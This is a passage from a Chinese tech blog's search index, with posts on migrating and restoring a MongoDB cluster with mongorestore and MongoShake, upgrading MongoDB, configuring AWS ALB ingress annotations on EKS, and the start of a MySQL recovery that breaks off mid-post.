2025 # 开始恢复，漫长的一天开始了 # 必须放到screen中执行，否则网络不好，断了也会很悲剧 screen -L ./mongorestore \\ --drop \\ --host=192.168.111.222 \\ --port=27017 \\ --username=root \\ --authenticationDatabase=admin \\ --nsExclude=admin \\ /root/dump ctrl+a+d 其实刚开始线下三节点得配置是8G，然后恢复用了一晚，报错，直接把shard3给打崩了，虽然三节点都是docker启动得，有自动恢复机制，但是mongorestore可不管这个，中断期间有1000个Document没有恢复成功。\n重试了2次后才发现这问题，2天已经过去了，意识到就立刻把内存提升到32G，再次进行恢复。\n但是新建的集群的密码跟源库这时是不一致的，又一天过去了，Document文档是恢复完毕，Index又无法建立，因为用户名和密码不一致，Fuck！\n又双叒再次开始恢复，这下天下大吉了，然后这还不算完！\nrestore后，其实又过了一天，那要追平之后的数据，就得用上实时同步工具了，这里用的是阿里的mongoshake\n下载：\nwget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz tar zxvf mongo-shake-v2.8.5.tgz cd mongo-shake-v2.8.5 wget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf 我们需要注意collector.conf的以下地方：\n# 源数据库 mongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin # 目标数据库 tunnel.address = mongodb://root:xxxxxxxx@192.168.4.5:27017/?authSource=admin # 同步模式，all表示全量+增量同步，full表示全量同步，incr表示增量同步。 # 也就是说，其实我们一开始就可以用full模式来进行同步，那为什么不呢？看下面的解释 sync_mode = incr # 那还有一个问题：就是如果mongoshake的collector进程掉了，比如被OOM了 # 下次再启动，会重新全量同步还是接着增量同步呢？ # 答案是：同步的时候，collector会在源库建立一个mongoshake的db，里面有个表ckpt_default，里面放着同步信息 # collector重启后会读取这个表进行增量同步，哪怕 sync_mode=full # 所以如果想重启后重新全量同步，那就需要手动删了这个表，或者换个表名，比如换成ckpt_sync # 那mongoshake实际是根据oplog进行同步的，那如果以前的oplog有删除，我们就必须用dump和restore进行一次完整备份恢复 # 然后再进行追平，那刚开始我们记录下来的时间戳就有用了 # Sun May 11 06:34:02 PM CST 2025 下午16点34分 # collector用的是UST时间，我们的时间是东八区，CST，所以要减去8小时，16-8=8 # 那就是：2025-05-11T08:30:00Z 时间稍稍前推一点，然后追平数据 checkpoint.storage.db = mongoshake checkpoint.storage.collection = ckpt_default checkpoint.start_position = 2025-05-11T08:30:00Z 然后注意，源库实际是个代理，直接连的话，有三个节点，而mongoshake是够不到这三个节点的，所以需要强制改成一个直接连接：\nmongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026amp;connect=direct 然后就开始同步\n# 注意，一定放到screen里 screen -L # verbose 需要是0，记录到文本文件，便于之后持续观察 ./collector.linux -conf=collector.conf -verbose 0 看日志有同步的，就OK\n","permalink":"https://rendoumi.com/posts/20250512-mongodb-restore/","summary":"\u003cp\u003e要做一个mongodb集群的迁移和恢复，真是折腾死人了。记录并顺便吐槽一下：\u003c/p\u003e\n\u003cp\u003emongodb的tools真的是太简易、粗糙、丑陋了。\u003c/p\u003e\n\u003cp\u003e线上的源数据库是腾讯的服务，要废弃搬迁到内网，足足折腾了一个星期。\u003c/p\u003e\n\u003cp\u003e线上源数据库环境如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e云数据库 TencentDB\u003c/li\u003e\n\u003cli\u003e4C/8GB/500GB\u003c/li\u003e\n\u003cli\u003e3节点\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e于是在线下对等建立了mongo集群，同样配置，同样3节点。\u003c/p\u003e\n\u003cp\u003e噩梦由此开始啊，注意线下集群的memory配置一定要高：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e32GB\u003c/li\u003e\n\u003cli\u003e用户名和密码一定要和线上完全一致\u003c/li\u003e\n\u003cli\u003e如果用户名密码不一致，Document恢复完毕，Index无法建立，因为是完全恢复，会覆盖admin这个db\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e然后开始dump线上数据\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump -vvvvv --uri\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后生成一个24G大小得dump文件夹，压缩后2.4G，传输到线下库上准备恢复\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 大量恢复必须扩大文件句柄，否则过不去\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -n \u003cspan class=\"m\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 一定要记录下来开始的时间戳，后面有用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSun May \u003cspan class=\"m\"\u003e11\u003c/span\u003e 06:34:02 PM CST \u003cspan class=\"m\"\u003e2025\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 开始恢复，漫长的一天开始了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 必须放到screen中执行，否则网络不好，断了也会很悲剧\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen -L\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mongorestore \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --drop \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --host\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.111.222 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --port\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e27017\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --username\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --authenticationDatabase\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --nsExclude\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   /root/dump\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ctrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其实刚开始线下三节点得配置是8G，然后恢复用了一晚，报错，直接把shard3给打崩了，虽然三节点都是docker启动得，有自动恢复机制，但是mongorestore可不管这个，中断期间有1000个Document没有恢复成功。\u003c/p\u003e\n\u003cp\u003e重试了2次后才发现这问题，2天已经过去了，意识到就立刻把内存提升到32G，再次进行恢复。\u003c/p\u003e\n\u003cp\u003e但是新建的集群的密码跟源库这时是不一致的，又一天过去了，Document文档是恢复完毕，Index又无法建立，因为用户名和密码不一致，Fuck！\u003c/p\u003e\n\u003cp\u003e又双叒再次开始恢复，这下天下大吉了，然后这还不算完！\u003c/p\u003e\n\u003cp\u003erestore后，其实又过了一天，那要追平之后的数据，就得用上实时同步工具了，这里用的是阿里的mongoshake\u003c/p\u003e\n\u003cp\u003e下载：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf mongo-shake-v2.8.5.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongo-shake-v2.8.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们需要注意\u003ccode\u003ecollector.conf\u003c/code\u003e的以下地方：\u003c/p\u003e","title":"mongodb 集群的恢复"},{"content":"mongodb 公司现在运行的版本是mongodb 4.2.19，在处理allowDiskUse的时候失败\n对比了一下，似乎另外一个集群跑的是5.0.5，就没有问题\n那就升级一下，步骤如下：\n首先下载 5.0.30\nwget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz 然后解压弄好，准备好mongodb.conf\ndump下来老数据，不加·\u0026ndash;quiet·的参数有可能会遇到EOF的错误\nmkdir mongobackup cd mongobackup mongodump --quiet 然后杀掉4.2.19，启动5.0.30，把数据回灌回去，同样要用--quiet参数\ncd mongobackup mongorestore --quiet 这样就OK了。\n注意，mongo 是吃内存大户，如果备份不下来，或者恢复不进去，请增加内存。\n曾有过一次，8G-\u0026gt;16G-\u0026gt;32G 才成功。\n而且必须一个一个db进行备份，一个一个db进行恢复，记得备份 admin 数据库\nmongodump -d message mongorestore --port 37017 --drop --nsInclude=message.* ","permalink":"https://rendoumi.com/posts/20250122-mongodb_upgrade/","summary":"\u003cp\u003emongodb 公司现在运行的版本是mongodb 4.2.19，在处理allowDiskUse的时候失败\u003c/p\u003e\n\u003cp\u003e对比了一下，似乎另外一个集群跑的是5.0.5，就没有问题\u003c/p\u003e\n\u003cp\u003e那就升级一下，步骤如下：\u003c/p\u003e\n\u003cp\u003e首先下载 5.0.30\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后解压弄好，准备好mongodb.conf\u003c/p\u003e\n\u003cp\u003edump下来老数据，不加·\u0026ndash;quiet·的参数有可能会遇到\u003ccode\u003eEOF\u003c/code\u003e的错误\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump --quiet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后杀掉4.2.19，启动5.0.30，把数据回灌回去，同样要用\u003ccode\u003e--quiet\u003c/code\u003e参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongorestore --quiet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就OK了。\u003c/p\u003e\n\u003cp\u003e注意，mongo 是吃内存大户，如果备份不下来，或者恢复不进去，请增加内存。\u003c/p\u003e\n\u003cp\u003e曾有过一次，8G-\u0026gt;16G-\u0026gt;32G 才成功。\u003c/p\u003e\n\u003cp\u003e而且必须一个一个db进行备份，一个一个db进行恢复，记得备份 admin 数据库\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump -d message\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongorestore --port \u003cspan class=\"m\"\u003e37017\u003c/span\u003e --drop --nsInclude\u003cspan class=\"o\"\u003e=\u003c/span\u003emessage.*\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"mongodb 如何升级"},{"content":"管理了一个AWS的EKS集群，用的是ALB的负载均衡，这个负载均衡和Nginx有区别，有很多特殊的地方需要注意。\n基本需要宣告很多独有的 annotations\n一、http自动跳转到https annotations: alb.ingress.kubernetes.io/actions.ssl-redirect: | {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} ...... - host: \u0026#39;*.bajie.dev\u0026#39; http: paths: - backend: service: name: ssl-redirect port: name: use-annotation path: / pathType: Prefix 注意，annotation了上面一条，那么在LB中，http 80的规则就只剩下这一条了，压倒一切的规则。\n之后你再annotation别的http规则，会不生效；你只能去annotition https的规则。\n二、www重定向 例子： 输入 rendoumi.com，会自动重定义到 www.rendoumi.com\nannotations: alb.ingress.kubernetes.io/actions.www-redirect: | {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.rendoumi.com\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} ...... - host: rendoumi.com http: paths: - backend: service: name: www-redirect port: name: use-annotation path: / pathType: Prefix 这个是直接301跳转到https去了\n三、external-dns ALB 的ingress有个大坑，那就是如果你大动ingress，前面的LB会发生变化，产生一个新的LB。这点非常要命，第一次遇到的时候，八戒被迫改掉了Route53的好多条DNS记录，擦的\n所以务必把这个加上，避免引起联动，反正无所谓，没装external-dns的话annotation的不起作用\nannotations: external-dns.alpha.kubernetes.io/hostname: rendoumi.com,www.rendoumi.com,*.rendoumi.com 把要管理的域名用逗号分开\n四、group属性 这个就是上面所说的大改动，加这个属性必然引起更换LB\n这个场景也是必须的，举例来说，不同的namespace中的ingress都要用到同一个域名\n这样就麻烦了，nginx ingress简单加个namespace就可以了，alb不行\n需要显式声明 group 属性\nannotations: alb.ingress.kubernetes.io/group.name: rendoumi alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; 注意，两个属性务必在一起， order缺省是0，最大1000\n这样LB会把不同ns中的ingress聚合成一个LB来使用\n最后，给个完全的例子：\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: annotations: alb.ingress.kubernetes.io/actions.ssl-redirect: | {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} alb.ingress.kubernetes.io/actions.www-redirect: | {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.bajie.dev\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:000007118436:certificate/xxxxa910-46c9-4680-929a-99996deb98df alb.ingress.kubernetes.io/group.name: bajie alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTP\u0026#34;: 80}, {\u0026#34;HTTPS\u0026#34;:443}]\u0026#39; alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/ssl-policy: ELBSecurityPolicy-TLS-1-1-2017-01 alb.ingress.kubernetes.io/ssl-redirect: \u0026#34;443\u0026#34; alb.ingress.kubernetes.io/subnets: subnet-99996c43cb399f55c,subnet-9999c9681d11a3323,subnet-99999874db9639a77 alb.ingress.kubernetes.io/target-type: ip external-dns.alpha.kubernetes.io/hostname: bajie.dev,www.bajie.dev,*.bajie.dev namespace: default spec: ingressClassName: alb rules: - host: official.bajie.dev http: paths: - backend: service: name: dc-official-client port: number: 3000 path: / pathType: Prefix - host: bajie.dev http: paths: - backend: service: name: www-redirect port: name: use-annotation path: / pathType: Prefix - host: \u0026#39;*.bajie.dev\u0026#39; http: paths: - backend: service: name: ssl-redirect port: name: use-annotation path: / pathType: Prefix tls: - hosts: - bajie.dev - www.bajie.dev - official.bajie.dev 我们在另外一个namespace annotatiton一个 ingress就是这样的\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: grafana namespace: prometheus annotations: alb.ingress.kubernetes.io/group.name: bajie alb.ingress.kubernetes.io/group.order: \u0026#39;10\u0026#39; alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:533267118436:certificate/e6c3a910-46c9-4680-929a-d60d6deb98df external-dns.alpha.kubernetes.io/hostname: grafana.bajie.dev spec: ingressClassName: alb rules: - host: grafana.bajie.dev http: paths: - path: / pathType: Prefix backend: service: name: stable-grafana port: number: 80 tls: - hosts: - grafana.bajie.dev 注意 order，grafana的order是10，而上面是100，所以grafana的记录会出现在*之前，否则，就首先被 星号 拦截，然后才到 grafana的路径，就不对了。\n","permalink":"https://rendoumi.com/posts/20250120-aws_alb_ingress/","summary":"\u003cp\u003e管理了一个AWS的EKS集群，用的是ALB的负载均衡，这个负载均衡和Nginx有区别，有很多特殊的地方需要注意。\u003c/p\u003e\n\u003cp\u003e基本需要宣告很多独有的 annotations\u003c/p\u003e\n\u003ch4 id=\"一http自动跳转到https\"\u003e一、http自动跳转到https\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    alb.ingress.kubernetes.io/actions.ssl-redirect: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;redirect\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;RedirectConfig\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Protocol\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HTTPS\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;Port\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;443\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;StatusCode\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HTTP_301\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  - host: \u003cspan class=\"s1\"\u003e\u0026#39;*.bajie.dev\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    http:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      paths:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - backend:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: ssl-redirect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            port:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              name: use-annotation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        path: /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        pathType: Prefix     \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，annotation了上面一条，那么在LB中，http 80的规则就只剩下这一条了，压倒一切的规则。\u003c/p\u003e\n\u003cp\u003e之后你再annotation别的http规则，会不生效；你只能去annotition https的规则。\u003c/p\u003e\n\u003ch4 id=\"二www重定向\"\u003e二、www重定向\u003c/h4\u003e\n\u003cp\u003e例子：  输入 rendoumi.com，会自动重定义到 \u003ca href=\"https://www.rendoumi.com\"\u003ewww.rendoumi.com\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    alb.ingress.kubernetes.io/actions.www-redirect: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;redirect\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;redirectConfig\u0026#34;\u003c/span\u003e:\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;www.rendoumi.com\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;port\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;443\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;protocol\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;HTTPS\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;statusCode\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;HTTP_301\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  - host: rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    http:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      paths:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - backend:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: www-redirect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            port:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              name: use-annotation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        path: /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        pathType: Prefix\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个是直接301跳转到https去了\u003c/p\u003e","title":"AWS alb 负载均衡做ingress的注意事项"},{"content":"同事上线，把数据库初始化脚本改了名。结果导致上线把库表的数据全给重新初始化了。这下事来了，恢复库表。\n之前用过阿里云的库表恢复，非常简洁，那这次也照猫画虎学一回，步骤如下：\n一、保存现在的记录：\n把所有相关的binlog拷贝到一个备份目录保存。\n二、最好新建一个mysql实例：\n阿里确实事新起了一个实例，避免操作对旧实例造成影响。\n我们实战中可能没必要，但也要封锁数据库的读写：\niptables -I INPUT -p tcp --dport 3306 -j DROP # 把自己放通，后续可能自己要进行 